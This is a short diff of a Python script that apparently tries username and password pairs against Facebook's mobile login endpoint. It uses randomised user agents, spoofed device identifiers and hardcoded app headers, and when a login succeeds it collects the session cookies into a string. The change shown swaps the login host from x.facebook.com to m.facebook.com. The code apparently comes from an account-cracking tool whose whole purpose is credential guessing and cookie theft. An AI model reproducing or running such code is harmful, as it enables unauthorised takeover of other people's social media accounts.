@@ -515,7 +515,7 @@ def m(uid,pwx,tl):
             bi = random.choice([A])
             session = requests.Session()
             ff = random.choice(ugen)
-            free_fb = session.get('https://x.facebook.com').text
+            free_fb = session.get('https://m.facebook.com').text
             log_data = {"adid": adid,
                     "format": "json",
                     "device_id": str(uuid.uuid4()),
@@ -553,7 +553,7 @@ def m(uid,pwx,tl):
                     'X-FB-Server-Cluster': 'True',
                     'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                     'Content-Length': '706'}
-            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header).text
+            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
